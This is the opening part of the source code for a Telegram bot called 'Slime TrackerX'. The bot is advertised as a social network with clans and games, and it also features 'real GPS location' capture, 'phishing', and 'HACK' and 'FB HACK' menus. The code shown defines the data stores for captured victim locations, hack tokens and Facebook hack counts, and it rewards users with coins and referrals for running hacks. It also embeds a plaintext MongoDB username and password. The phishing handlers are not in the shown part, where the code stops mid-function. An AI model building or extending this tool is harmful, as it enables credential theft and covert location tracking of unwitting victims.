// =====================================================
// 🔥 SLIME TRACKERX v6.0 - ULTRA DOPE COMPLETE 🔥
// =====================================================
// 📍 REAL GPS LOCATION | 👤 SOCIAL NETWORK | 🏰 CLANS
// ⚔️ REFERRAL WARS | 💀 PHISHING | 📝 WORD BATTLE
// =====================================================

const { Telegraf } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const mongoose = require("mongoose");
const fs = require("fs-extra");
const multer = require("multer");
const axios = require("axios");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ========== 🔥 CONFIG ==========
const DOMAIN = process.env.DOMAIN || "https://slime-trackerx-pro.onrender.com";
const CHANNEL = process.env.CHANNEL || "@devxtechzone";
const OWNER_ID = parseInt(process.env.OWNER_ID) || 7271063368;
const MENU_IMAGE = "https://i.ibb.co/Txh7V7JL/IMG-3283.jpg";

// ========== 💰 ECONOMY ==========
const WEB_PRICE = 15;
const TRACK_COST = 15;
const NEW_COINS = 15;
const REF_REWARD = 10;
const DAILY_REWARD = 5;
const WORK_REWARD = 5;
const CLAN_COST = 20;
const WAR_MIN_BET = 50;
const WORD_MIN_BET = 5;
const WORD_MAX_BET = 500;

// ========== 🎮 WORD DIFFICULTY ==========
const difficulties = {
  easy: { name: "🍃 EASY", timer: 45, letters: 3, multiplier: 1 },
  medium: { name: "⚡ MEDIUM", timer: 30, letters: 5, multiplier: 2 },
  hard: { name: "🔥 HARD", timer: 15, letters: 7, multiplier: 3 },
  expert: { name: "💀 EXPERT", timer: 8, letters: 9, multiplier: 5 }
};

// ========== 📚 COMPLETE WORDS ==========
const wordsByLength = {
  3: ["CAT", "DOG", "SUN", "CAR", "BAG", "HAT", "LEG", "EYE", "CUP", "BED", "RED", "HOT", "BIG", "NEW", "OLD", "FUN", "RUN", "SIT", "EAT", "FLY", "CRY", "JOY", "SAD", "WET", "DRY", "FAT", "RAT", "BAT", "MAT", "PAT", "SAT", "HEN", "PEN", "DEN", "MEN", "TEN", "NET", "PET", "GET", "JET", "SET", "BET", "LET", "MET", "YET", "ZIP", "LIP", "TIP", "HIP", "DIP", "RIP", "SIP", "NIP", "MAP", "CAP", "TAP", "GAP", "LAP", "SAP", "NAP", "VAN", "MAN", "CAN", "PAN", "FAN", "BAN", "RAN", "WAN", "HIT", "KIT", "BIT", "FIT", "PIT", "WIT", "ROW", "COW", "HOW", "NOW", "LOW", "BOW", "TOW", "TOY", "BOY", "DAY", "WAY", "PAY", "SAY", "KEY", "HEY", "ICE", "ACE", "AGE", "ARE", "AND", "END", "INK", "OWL", "EAR", "ARM", "ANT", "WEB", "LAB", "CAB", "JAB", "TUB", "SUB", "RUB", "CUB", "PUB", "HUB", "DAD", "MOM", "SON", "DIE", "LIE", "TIE", "PIE", "DUE", "SUE", "BAR", "FAR", "JAR", "TAR", "OAR", "EEL", "FEE", "SEE", "TEE", "BEE", "JOB", "MOB", "ROB", "SOB", "BUD", "MUD", "LED", "WED", "DOT", "NOT", "POT", "ROT", "COT", "GOT", "LOT", "BOT", "DIM", "RIM", "HIM", "TIM", "WIN", "PIN", "TIN", "BIN", "DIN", "FIN", "BUM", "GUM", "HUM", "RUM", "SUM", "CUT", "HUT", "NUT", "RUT", "BUT", "GUT", "PUT", "LUG", "BUG", "DUG", "HUG", "JUG", "MUG", "RUG", "TUG", "ELK", "MILK", "SILK", "BARK", "DARK", "LARK", "MARK", "PARK", "BARN", "YARN", "CART", "DART", "PART", "DISH", "WISH", "RING", "SING", "WING", "MINT", "HINT", "LINT", "TINT", "LION", "IRON", "FIRST", "DIRTY", "THIRST"],
  4: ["FISH", "BIRD", "FROG", "STAR", "MOON", "TREE", "WIND", "FIRE", "ROCK", "SAND", "SHIP", "KING", "RING", "SING", "WING", "BOOK", "COOK", "LOOK", "LION", "BEAR", "WOLF", "DEER", "GOAT", "DUCK", "SWAN", "SEAL", "ROAD", "PATH", "WALL", "DOOR", "ROOF", "ROOM", "HALL", "YARD", "GATE", "FARM", "BLUE", "PINK", "GRAY", "GOLD", "SILK", "WOOL", "CASH", "COIN", "NOTE", "BANK", "TIME", "YEAR", "WEEK", "HOUR", "MATH", "CODE", "DATA", "FILE", "FORM", "PLAY", "GAME", "TEAM", "GOAL", "PASS", "KICK", "RACE", "JUMP", "DIVE", "SWIM", "FOOD", "RICE", "MEAT", "CAKE", "SOUP", "EGGS", "SALT", "SPIN", "RAIN", "SNOW", "HEAT", "COLD", "MIST", "FOG", "HAIL", "CLAY", "HAND", "HEAD", "FOOT", "NOSE", "MOUTH", "TEETH", "HAIR", "BELL", "FORK", "SPOON", "KNIFE", "PLATE", "BOWL", "CUP", "MUG", "GLASS", "TABLE", "CHAIR", "COUCH", "DESK", "LAMP", "CLOCK", "RADIO", "PHONE", "MOUSE", "TICKET", "MONEY", "CARD", "BILL", "BAG", "SHIRT", "PANTS", "SKIRT", "DRESS", "SHOES", "SOCKS", "HAT", "CAP", "COAT", "BELT", "WATCH", "LAPTOP", "CABLE", "LIGHT", "BULB", "BUTTON", "SCREEN", "COLOR", "BLACK", "WHITE", "RED", "BLUE", "GREEN", "YELLOW", "PURPLE", "ORANGE", "PINK", "BROWN", "GREY", "SILVER", "GOLDEN", "BRONZE", "STEEL", "WOOD", "STONE", "PAPER", "GLASS", "LEATHER", "COTTON", "WOOL", "SILK", "DENIM", "JEANS"],
  5: ["APPLE", "MANGO", "GRAPE", "BERRY", "PEACH", "LEMON", "MELON", "GUAVA", "OLIVE", "HOUSE", "TABLE", "CHAIR", "COUCH", "SHELF", "PLATE", "GLASS", "SPOON", "FORKS", "KNIFE", "HAPPY", "SMART", "BRAVE", "CALM", "KIND", "PROUD", "SHARP", "QUICK", "SWEET", "TOUGH", "LIGHT", "CLEAR", "CLEAN", "DIRTY", "FRESH", "SOFT", "HARD", "WATER", "RIVER", "OCEAN", "LAKES", "BEACH", "SHORE", "WAVES", "DEPTH", "PLANT", "GRASS", "TREES", "LEAFY", "ROOTS", "BLOOM", "FRUIT", "SEEDS", "GREEN", "MONEY", "VALUE", "PRICE", "COSTS", "SPEND", "TRADE", "STOCK", "BANKS", "POWER", "FORCE", "SPEED", "MOTOR", "DRIVE", "WHEEL", "TRACK", "WORLD", "EARTH", "SPACE", "STARS", "PLANE", "ROBOT", "DRONE", "ORBIT", "SOLAR", "PEACE", "UNITY", "HUMAN", "HEART", "BRAIN", "MUSIC", "DANCE", "COLOR", "BLACK", "WHITE", "BROWN", "GREEN", "YELLOW", "PURPLE", "ORANGE", "SILVER", "GOLDEN", "MAGIC", "CLOUD", "STORM", "FLOWER", "GARDEN", "FOREST", "MOUNTAIN", "VALLEY", "DESERT", "ISLAND", "PALACE", "CASTLE", "TEMPLE", "CHURCH", "SCHOOL", "COLLEGE", "HOSPITAL", "OFFICE", "MARKET", "STORE", "MALL", "PARK", "ZOO", "HOTEL", "CAFE", "BRIDGE", "TUNNEL", "HIGHWAY", "STREET", "PLANE", "SHIP", "BOAT", "TRAIN", "BUS", "TRUCK", "BIKE"],
  6: ["BANANA", "ORANGE", "PURPLE", "YELLOW", "SILVER", "GOLDEN", "RABBIT", "TIGER", "EAGLE", "SHARK", "WHALE", "ZEBRA", "SNAKE", "WOLF", "BEAR", "FOX", "HORSE", "CATTLE", "SHEEP", "GOAT", "BUTTER", "CHEESE", "BREAD", "SUGAR", "SALT", "PEPPER", "HONEY", "MILK", "COFFEE", "TEA", "JUICE", "DRINK", "SMOOTH", "BITTER", "SWEET", "FLAVOR", "TASTE", "DINNER", "LUNCH", "GARDEN", "PALACE", "CASTLE", "TEMPLE", "SCHOOL", "COLLEGE", "OFFICE", "MARKET", "STREET", "AVENUE", "HIGHWAY", "BRIDGE", "TUNNEL", "STATION", "AIRPORT", "HARBOR", "CENTER", "PLAZA", "PLAYER", "DRIVER", "WRITER", "READER", "SINGER", "DANCER", "ACTOR", "CREATE", "DESIGN", "CODING", "SYSTEM", "SERVER", "CLIENT", "NETWORK", "SECURE", "ACCESS", "MEMORY", "FUTURE", "HISTORY", "SCIENCE", "MUSIC", "SPORTS", "GAMING", "POWER", "ENERGY", "FORCE", "ACTION", "REACTION", "RESULT", "OUTPUT", "SOURCE", "TARGET", "OBJECT", "FORMAT", "DEVELOP", "PROGRAM", "FUNCTION", "METHOD", "CLASS", "MODULE", "LIBRARY", "DATABASE", "STORAGE", "BACKUP", "UPDATE", "CONFIG", "OPTION", "FEATURE", "SKILL", "TALENT", "MASTER", "EXPERT", "SECRET", "MYSTERY", "PUZZLE", "ANSWER", "SOLUTION", "PROBLEM"],
  7: ["ANIMALS", "FARMERS", "HUNTERS", "DRIVERS", "PLAYERS", "WRITERS", "TEACHER", "STUDENT", "DOCTORS", "FREEDOM", "JUSTICE", "COURAGE", "NETWORK", "SYSTEMS", "PROGRAM", "SERVERS", "STORAGE", "COUNTRY", "VILLAGE", "CITIES", "MARKETS", "STORES", "HOUSES", "FASHION", "CLOTHES", "SHIRTS", "JACKETS", "SHOES", "WEATHER", "RAINING", "SNOWING", "SUNRISE", "SUNSETS", "STORMS", "THUNDER", "CLIMATE", "SEASONS", "ANCIENT", "HISTORY", "BIOLOGY", "PHYSICS", "CHEMIST", "NATURAL", "SOCIAL", "CULTURE", "LANGUAGE", "ENGLISH", "SPANISH", "FRENCH", "GERMAN", "SCIENCE", "MUSIC", "SPORTS", "GAMING", "CODING", "HACKING", "SECURITY", "PRIVACY", "PROTECT", "DEFENSE", "ATTACK", "STRATEGY", "METHODS", "SKILLS", "PASSION", "MOTIVATION", "CREATIVE", "SOLUTION", "PROBLEM", "MYSTERY", "JOURNEY", "ADVENTURE", "FRIENDS", "FAMILY", "HAPPY", "SADNESS", "COURAGE", "HONESTY", "KINDNESS", "LOYALTY", "RESPECT", "HONOR", "SUCCESS", "VICTORY", "TRIUMPH", "CHAMPION", "MASTER", "EXPERT", "ENGINEER", "SCIENTIST", "RESEARCH", "DEVELOP", "PRODUCE", "CREATE", "DESIGN", "BUILD", "PROCESS", "REFINE", "EXTRACT", "COMBINE", "TRANSPORT"],
  8: ["ELEPHANT", "GIRAFFES", "KANGAROO", "DOLPHINS", "PENGUINS", "COMPUTER", "KEYBOARD", "MONITOR", "PRINTER", "SCANNER", "ROUTERS", "NETWORKS", "DATABASE", "SOFTWARE", "HARDWARE", "SECURITY", "FIREWALL", "INTERNET", "BROWSERS", "PROGRAMS", "BEAUTIFUL", "WONDERFUL", "EXCITING", "ADVENTURE", "MYSTERY", "JOURNEY", "DISCOVER", "EXPLORE", "CHALLENGE", "VICTORY", "STRENGTH", "FRIENDS", "HAPPINES", "POWERFUL", "CREATIVE", "THINKING", "LEARNING", "TEACHING", "BUILDING", "PLANNING", "STRATEGY", "BUSINESS", "MARKETING", "FINANCES", "ECONOMY", "INDUSTRY", "PRODUCTS", "SERVICES", "CUSTOMER", "SUPPORTS", "DELIVERY", "LOGISTICS", "MANAGERS", "TEAMWORK", "SUCCESS", "FAILURES", "PROGRESS", "MOTIVATION", "INSPIRATION", "CREATIVITY", "INNOVATION", "TECHNOLOGY", "EDUCATION", "KNOWLEDGE", "WISDOM", "INTELLIGENT", "BRILLIANT", "EXCELLENT", "OUTSTANDING", "REMARKABLE"],
  9: ["INCREDIBLE", "IMPORTANT", "DIFFERENT", "KNOWLEDGE", "EDUCATION", "DEVELOPER", "HAPPINESS", "BEAUTIFUL", "POWERFULL", "STRONGEST", "BRIGHTEST", "COMPUTERS", "PROGRAMER", "SOFTWARES", "DATABASES", "NETWORKED", "SECURITYS", "FIREWALLS", "INTERNETS", "MARKETING", "FINANCIAL", "COMPANIES", "CUSTOMERS", "MANAGEMENT", "TEAMWORKS", "SUCCESSES", "FAILURES", "PROGRESSES", "OPERATIONS", "TECHNOLOGY", "EDUCATION", "KNOWLEDGE", "WISDOM", "INTELLIGENT", "BRILLIANT", "EXCELLENT", "OUTSTANDING", "REMARKABLE", "EXTRAORDINARY", "PHENOMENAL", "SPECTACULAR", "MAGNIFICENT", "FANTASTIC", "UNBELIEVABLE"]
};

// ========== 📁 SETUP ==========
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads/'),
  filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});
const upload = multer({ storage, limits: { fileSize: 10 * 1024 * 1024 } });

app.use(bodyParser.json({ limit: "100mb" }));
app.use(express.static("public"));
app.use(express.static("pages")); // Serve HTML pages from /pages folder
app.use("/uploads", express.static("uploads"));
app.use("/avatars", express.static("public/avatars"));

fs.ensureDirSync("uploads");
fs.ensureDirSync("public");
fs.ensureDirSync("public/avatars");
fs.ensureDirSync("pages");

// ========== 🗄️ MONGODB ==========
const MONGODB_URI = process.env.MONGODB_URI || "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/prosuite";

const connectDB = async () => {
  try {
    await mongoose.connect(MONGODB_URI);
    console.log('✅ MongoDB Connected');
  } catch (err) {
    console.error('❌ MongoDB Error:', err.message);
    setTimeout(connectDB, 5000);
  }
};
connectDB();

// ========== 📊 SCHEMAS ==========
const userSchema = new mongoose.Schema({
  userId: { type: Number, unique: true },
  displayName: { type: String, default: "" },
  avatar: { type: String, default: "" },
  coverPhoto: { type: String, default: "" },
  bio: { type: String, default: "🔥 SlimeTrackerX User" },
  location: { type: String, default: "" },
  website: { type: String, default: "" },
  birthday: { type: String, default: "" },
  joinDate: { type: Date, default: Date.now },
  lastActive: { type: Date, default: Date.now },
  followers: { type: [Number], default: [] },
  following: { type: [Number], default: [] },
  friends: { type: [Number], default: [] },
  friendRequests: { type: [Number], default: [] },
  blocked: { type: [Number], default: [] },
  posts: { type: [Object], default: [] },
  stories: { type: [Object], default: [] },
  notifications: { type: [Object], default: [] },
  unreadNotifs: { type: Number, default: 0 },
  coins: { type: Number, default: NEW_COINS },
  diamonds: { type: Number, default: 0 },
  level: { type: Number, default: 1 },
  xp: { type: Number, default: 0 },
  streak: { type: Number, default: 0 },
  lastDaily: Date,
  wins: { type: Number, default: 0 },
  losses: { type: Number, default: 0 },
  wordWins: { type: Number, default: 0 },
  wordLosses: { type: Number, default: 0 },
  hacks: { type: Number, default: 0 },
  facebookHacks: { type: Number, default: 0 },
  websites: { type: [Object], default: [] },
  clan: { type: String, default: null },
  clanRank: { type: String, default: "Member" },
  badges: { type: [String], default: ["🎁 Newbie"] },
  referrals: { type: Number, default: 0 },
  referrer: { type: Number, default: null },
  isAdmin: { type: Boolean, default: false },
  profileViews: { type: [Number], default: [] },
  capturedLocations: { type: [Object], default: [] }
});

const clanSchema = new mongoose.Schema({
  name: { type: String, unique: true },
  tag: String,
  description: { type: String, default: "New clan on SlimeTrackerX" },
  clanAvatar: { type: String, default: "" },
  leaderId: Number,
  coLeaders: [Number],
  members: [Number],
  coins: { type: Number, default: 0 },
  xp: { type: Number, default: 0 },
  level: { type: Number, default: 1 },
  wins: { type: Number, default: 0 },
  losses: { type: Number, default: 0 },
  referralWarActive: { type: Boolean, default: false },
  referralWarEnds: Date,
  referralWarTarget: { type: Number, default: 0 },
  referralWarBet: Number,
  referralWarOpponent: String,
  createdAt: { type: Date, default: Date.now }
});

const codeSchema = new mongoose.Schema({
  code: String,
  coins: Number,
  diamonds: Number,
  usedBy: [Number],
  maxUses: Number,
  left: Number,
  expire: Date
});

const websiteSchema = new mongoose.Schema({
  name: String,
  ownerId: Number,
  template: String,
  content: Object,
  createdAt: Date
});

const User = mongoose.model('User', userSchema);
const Clan = mongoose.model('Clan', clanSchema);
const Code = mongoose.model('Code', codeSchema);
const Website = mongoose.model('Website', websiteSchema);

// ========== 💾 CACHE ==========
let usersCache = new Map();
let clansCache = new Map();
let codesCache = new Map();
let webBuilds = new Map();
let bannedUsers = new Set();
let workCD = new Map();
let wordChallenges = new Map();
let hackTokens = new Map();
let facebookTokens = new Map();
let duelChallenges = new Map();
let userLastMessages = new Map();

// ========== 📥 DATABASE FUNCTIONS ==========
async function loadData() {
  try {
    const users = await User.find({});
    users.forEach(u => usersCache.set(u.userId, u));
    const clans = await Clan.find({});
    clans.forEach(c => clansCache.set(c.name, c));
    console.log(`📂 Loaded ${usersCache.size} users, ${clansCache.size} clans`);
  } catch (err) {
    console.error("Error loading data:", err);
    setTimeout(loadData, 5000);
  }
}

async function saveUser(userId, data) {
  try {
    await User.findOneAndUpdate({ userId }, data, { upsert: true });
    usersCache.set(userId, data);
  } catch (err) {
    console.error("Error saving user:", err);
  }
}

async function saveClan(name, data) {
  try {
    await Clan.findOneAndUpdate({ name }, data, { upsert: true });
    clansCache.set(name, data);
  } catch (err) {
    console.error("Error saving clan:", err);
  }
}

async function initUser(userId, referrerId = null) {
  let user = usersCache.get(userId);
  if (!user) {
    let username = "";
    try {
      let chat = await bot.telegram.getChat(userId);
      username = chat.username || `user_${userId}`;
    } catch(e) { username = `user_${userId}`; }
    
    user = {
      userId,
      displayName: username,
      avatar: "",
      coverPhoto: "",
      bio: "🔥 SlimeTrackerX User",
      location: "",
      website: "",
      birthday: "",
      joinDate: new Date(),
      lastActive: new Date(),
      followers: [],
      following: [],
      friends: [],
      friendRequests: [],
      blocked: [],
      posts: [],
      stories: [],
      notifications: [],
      unreadNotifs: 0,
      coins: NEW_COINS,
      diamonds: 0,
      level: 1,
      xp: 0,
      streak: 0,
      lastDaily: null,
      wins: 0,
      losses: 0,
      wordWins: 0,
      wordLosses: 0,
      hacks: 0,
      facebookHacks: 0,
      websites: [],
      clan: null,
      clanRank: "Member",
      badges: ["🎁 Newbie"],
      referrals: 0,
      referrer: referrerId,
      isAdmin: userId === OWNER_ID,
      profileViews: [],
      capturedLocations: []
    };
    await saveUser(userId, user);
    
    // Handle referral for clan war points
    if (referrerId && referrerId !== userId) {
      let referrer = usersCache.get(referrerId);
      if (referrer) {
        referrer.coins += REF_REWARD;
        referrer.referrals++;
        await saveUser(referrerId, referrer);
        await addNotification(referrerId, `🎉 New referral! +${REF_REWARD} coins`, "system");
        
        // Update clan referral war score if clan in active war
        if (referrer.clan) {
          let clan = clansCache.get(referrer.clan);
          if (clan && clan.referralWarActive && clan.referralWarEnds > new Date()) {
            clan.referralWarTarget = (clan.referralWarTarget || 0) + 1;
            await saveClan(clan.name, clan);
            await bot.telegram.sendMessage(clan.leaderId, `⚔️ REFERRAL WAR: ${clan.name} +1 point! Total: ${clan.referralWarTarget}`);
          }
        }
      }
    }
  }
  return user;
}

async function addCoin(userId, amount) {
  let user = usersCache.get(userId);
  if (user) {
    user.coins += amount;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function takeCoin(userId, amount) {
  let user = usersCache.get(userId);
  if (user && user.coins >= amount) {
    user.coins -= amount;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function addXP(userId, amount) {
  let user = usersCache.get(userId);
  if (user) {
    user.xp += amount;
    let needed = user.level * 100;
    if (user.xp >= needed) {
      user.xp -= needed;
      user.level++;
      let reward = user.level * 10;
      user.coins += reward;
      user.badges.push(`🏅 Level ${user.level}`);
      await saveUser(userId, user);
      bot.telegram.sendMessage(userId, `🎉 **LEVEL UP!** 🎉\n\nLevel ${user.level - 1} → ${user.level}\n💰 +${reward} coins`).catch(() => {});
    } else {
      await saveUser(userId, user);
    }
  }
}

async function addNotification(userId, message, type = "system") {
  let user = usersCache.get(userId);
  if (user) {
    user.notifications.unshift({
      id: Date.now().toString(),
      message,
      type,
      read: false,
      createdAt: new Date()
    });
    user.unreadNotifs++;
    if (user.notifications.length > 50) user.notifications.pop();
    await saveUser(userId, user);
  }
}

async function getUsername(userId) {
  try {
    let chat = await bot.telegram.getChat(userId);
    return chat.username || `user_${userId}`;
  } catch {
    return `user_${userId}`;
  }
}

function refLink(id) {
  return `https://t.me/${bot.botInfo?.username || 'SlimeTrackerXBot'}?start=ref_${id}`;
}

async function sendMessage(ctx, text, extra = {}) {
  try {
    const lastMsg = userLastMessages.get(ctx.from.id);
    if (lastMsg) {
      try { await bot.telegram.deleteMessage(ctx.chat.id, lastMsg); } catch(e) {}
    }
    let sentMsg = await ctx.reply(text, { parse_mode: "Markdown", ...extra });
    userLastMessages.set(ctx.from.id, sentMsg.message_id);
    return sentMsg;
  } catch (err) {
    return await ctx.reply(text, { ...extra });
  }
}

// ========== 🎛️ MAIN MENU ==========
function getMainMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "👤 PROFILE", callback_data: "menu_profile" }, { text: "📰 NEWS FEED", callback_data: "menu_newsfeed" }],
        [{ text: "🏰 CLAN", callback_data: "menu_clan" }, { text: "🔔 NOTIFS", callback_data: "menu_notifs" }],
        [{ text: "💀 HACK", callback_data: "menu_hack" }, { text: "📘 FB HACK", callback_data: "menu_fbhack" }],
        [{ text: "📝 WORD BATTLE", callback_data: "menu_word" }, { text: "🌐 WEBSITE", callback_data: "menu_web" }],
        [{ text: "🎰 CASINO", callback_data: "menu_casino" }, { text: "💰 ECONOMY", callback_data: "menu_eco" }],
        [{ text: "🏆 LEADERBOARD", callback_data: "menu_leaderboard" }, { text: "🔗 REFERRAL", callback_data: "menu_ref" }],
        [{ text: "📢 CHANNEL", url: "https://t.me/devxtechzone" }, { text: "👑 ADMIN", callback_data: "menu_admin" }]
      ]
    }
  };
}

// ========== 🛡️ MIDDLEWARE & FORCE JOIN ==========
async function checkJoin(userId) {
  try {
    const chatMember = await bot.telegram.getChatMember(CHANNEL, userId);
    const allowed = ["creator", "administrator", "member", "restricted"];
    return allowed.includes(chatMember.status);
  } catch { return false; }
}

bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  
  let user = usersCache.get(ctx.from.id);
  if (user) { 
    user.lastActive = new Date(); 
    await saveUser(ctx.from.id, user); 
  }
  
  if (ctx.from.id === OWNER_ID) return next();
  if (ctx.callbackQuery && ctx.callbackQuery.data === "check_join") return next();
  
  const isMember = await checkJoin(ctx.from.id);
  if (!isMember) {
    if (ctx.callbackQuery) return ctx.answerCbQuery("❌ JOIN CHANNEL FIRST!", true);
    return ctx.reply(`🚫 **JOIN ${CHANNEL} FIRST!**`, {
      reply_markup: { inline_keyboard: [[{ text: "📢 JOIN", url: "https://t.me/devxtechzone" }, { text: "✅ I JOINED", callback_data: "check_join" }]] }
    });
  }
  return next();
});

bot.action("check_join", async (ctx) => {
  const isMember = await checkJoin(ctx.from.id);
  if (isMember) {
    await ctx.answerCbQuery("✅ VERIFIED!");
    let user = await initUser(ctx.from.id);
    await sendMessage(ctx, 
      `🔥 **SLIME TRACKERX v6.0** 🔥\n\n✨ Welcome ${ctx.from.first_name}!\n\n💰 ${user.coins} COINS\n📊 LEVEL ${user.level}\n👥 ${user.followers.length} FOLLOWERS\n🏰 CLAN: ${user.clan || "None"}\n📍 REAL LOCATION READY\n\n⬇️ **YOUR SOCIAL NETWORK** ⬇️`,
      { ...getMainMenu() }
    );
  } else {
    await ctx.answerCbQuery("❌ Not a member!");
  }
});

// ========== 🚀 START ==========
bot.start(async (ctx) => {
  let ref = null;
  let args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) ref = parseInt(args[1].replace("ref_", ""));
  let user = await initUser(ctx.from.id, ref);
  
  await sendMessage(ctx,
    `🔥 **SLIME TRACKERX v6.0** 🔥\n\n✨ Welcome ${ctx.from.first_name}!\n\n💰 ${user.coins} COINS\n📊 LEVEL ${user.level}\n👥 ${user.followers.length} FOLLOWERS\n🏰 CLAN: ${user.clan || "None"}\n📍 REAL LOCATION READY\n\n⬇️ **YOUR SOCIAL NETWORK** ⬇️`,
    { ...getMainMenu() }
  );
});

// ========== 👤 PROFILE COMMANDS ==========
bot.command("setname", async (ctx) => {
  let args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args) return sendMessage(ctx, "❌ Usage: /setname [Your Name]");
  let user = await initUser(ctx.from.id);
  user.displayName = args.substring(0, 30);
  await saveUser(ctx.from.id, user);
  await sendMessage(ctx, `✅ Display name changed to: **${user.displayName}**`);
});

bot.command("setbio", async (ctx) => {
  let args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args) return sendMessage(ctx, "❌ Usage: /setbio [Your bio]");
  let user = await initUser(ctx.from.id);
  user.bio = args.substring(0, 150);
  await saveUser(ctx.from.id, user);
  await sendMessage(ctx, `✅ Bio updated!\n\n📝 "${user.bio}"`);
});

bot.command("setlocation", async (ctx) => {
  let args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args) return sendMessage(ctx, "❌ Usage: /setlocation [City, Country]\n\n📝 Example: /setlocation Lagos, Nigeria");
  let user = await initUser(ctx.from.id);
  user.location = args.substring(0, 50);
  await saveUser(ctx.from.id, user);
  await sendMessage(ctx, `📍 Location set to: ${user.location}`);
});

bot.command("setavatar", async (ctx) => {
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return sendMessage(ctx, "❌ Reply to a photo with /setavatar");
  }
  let photo = ctx.message.reply_to_message.photo[ctx.message.reply_to_message.photo.length - 1];
  let file = await ctx.telegram.getFile(photo.file_id);
  let filename = `avatar_${ctx.from.id}_${Date.now()}.jpg`;
  let filepath = path.join(__dirname, "public/avatars", filename);
  
  const fileUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${file.file_path}`;
  const response = await axios({ method: "get", url: fileUrl, responseType: "stream" });
  const writer = fs.createWriteStream(filepath);
  response.data.pipe(writer);
  
  await new Promise((resolve, reject) => {
    writer.on("finish", resolve);
    writer.on("error", reject);
  });
  
  let user = await initUser(ctx.from.id);
  user.avatar = `${DOMAIN}/avatars/${filename}`;
  if (!user.badges.includes("📸 Photogenic")) user.badges.push("📸 Photogenic");
  await saveUser(ctx.from.id, user);
  await sendMessage(ctx, `✅ Avatar updated! + Badge: 📸 Photogenic`);
});

bot.command("profile", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let targetId = ctx.from.id;
  
  if (args[1] && args[1].startsWith("@")) {
    let username = args[1].replace("@", "");
    for (let [id] of usersCache) {
      try {
        let chat = await ctx.telegram.getChat(id);
        if (chat.username === username) { targetId = id; break; }
      } catch(e) {}
    }
  }
  
  let user = usersCache.get(targetId);
  if (!user) return sendMessage(ctx, "❌ User not found!");
  
  if (targetId !== ctx.from.id && !user.profileViews.includes(ctx.from.id)) {
    user.profileViews.push(ctx.from.id);
    await saveUser(targetId, user);
  }
  
  let avatarDisplay = user.avatar ? `🖼️ [Avatar](${user.avatar})` : "👤 No Avatar";
  let levelBar = "█".repeat(Math.floor((user.xp / (user.level * 100)) * 10)) + "░".repeat(10 - Math.floor((user.xp / (user.level * 100)) * 10));
  let isFollowing = user.followers.includes(ctx.from.id);
  
  let profileText = 
`╔══════════════════════════════╗
║  ${avatarDisplay}
║
║  ⭐ **${user.displayName || user.userId}** ⭐
║  @${await getUsername(user.userId)}
║
║  📝 ${user.bio}
║  📍 ${user.location || "Not set"}
║  🔗 ${user.website || "No website"}
║
║  👥 ${user.followers.length} followers
║  👣 ${user.following.length} following
║  🤝 ${user.friends.length} friends
║  🏰 Clan: ${user.clan || "None"} ${user.clanRank !== "Member" ? `(${user.clanRank})` : ""}
║  📅 Joined: ${new Date(user.joinDate).toLocaleDateString()}
║
║  📊 LEVEL ${user.level}
║  [${levelBar}] ${Math.floor((user.xp / (user.level * 100)) * 100)}%
║
║  🏆 BADGES:
║  ${user.badges.slice(0, 4).join(" | ")}
║
║  💰 ${user.coins} COINS
║  💀 ${user.hacks} HACKS
║  📸 ${user.posts.length} POSTS
║
║  👁️ ${user.profileViews.length} profile views
╚══════════════════════════════╝`;

  let buttons = [];
  if (targetId !== ctx.from.id) {
    buttons.push({ text: isFollowing ? "✅ FOLLOWING" : "➕ FOLLOW", callback_data: isFollowing ? `unfollow_${targetId}` : `follow_${targetId}` });
    buttons.push({ text: "💬 MSG", callback_data: `msg_${targetId}` });
  }
  buttons.push({ text: "📸 POSTS", callback_data: `viewposts_${targetId}` });
  
  await sendMessage(ctx, profileText, {
    reply_markup: { inline_keyboard: [buttons] }
  });
});

// ========== FOLLOW SYSTEM ==========
bot.action(/follow_(\d+)/, async (ctx) => {
  let targetId = parseInt(ctx.match[1]);
  let user = await initUser(ctx.from.id);
  let target = usersCache.get(targetId);
  
  if (!target) return ctx.answerCbQuery("User not found!");
  user.following.push(targetId);
  target.followers.push(ctx.from.id);
  await saveUser(ctx.from.id, user);
  await saveUser(targetId, target);
  await addNotification(targetId, `👥 @${ctx.from.username} started following you!`, "follow");
  await ctx.answerCbQuery(`Followed @${await getUsername(targetId)}`);
});

bot.action(/unfollow_(\d+)/, async (ctx) => {
  let targetId = parseInt(ctx.match[1]);
  let user = await initUser(ctx.from.id);
  let target = usersCache.get(targetId);
  
  if (target) {
    user.following = user.following.filter(id => id !== targetId);
    target.followers = target.followers.filter(id => id !== ctx.from.id);
    await saveUser(ctx.from.id, user);
    await saveUser(targetId, target);
    await ctx.answerCbQuery(`Unfollowed @${await getUsername(targetId)}`);
  }
});

bot.action(/viewposts_(\d+)/, async (ctx) => {
  let targetId = parseInt(ctx.match[1]);
  let user = usersCache.get(targetId);
  if (!user || !user.posts || user.posts.length === 0) {
    return ctx.answerCbQuery("No posts yet!");
  }
  
  let posts = user.posts.slice(-5).reverse();
  for (let post of posts) {
    let timeAgo = Math.floor((Date.now() - new Date(post.createdAt)) / 60000);
    let timeText = timeAgo < 1 ? "just now" : timeAgo < 60 ? `${timeAgo}m ago` : `${Math.floor(timeAgo/60)}h ago`;
    
    let text = `📸 **POST**\n🕐 ${timeText}\n📝 ${post.caption || "No caption"}\n❤️ ${post.likes?.length || 0} likes\n💬 ${post.comments?.length || 0} comments\n🆔 ID: ${post.id}`;
    if (post.image) {
      await ctx.replyWithPhoto(post.image, { caption: text });
    } else {
      await ctx.reply(text);
    }
  }
  await ctx.answerCbQuery();
});

bot.action(/msg_(\d+)/, async (ctx) => {
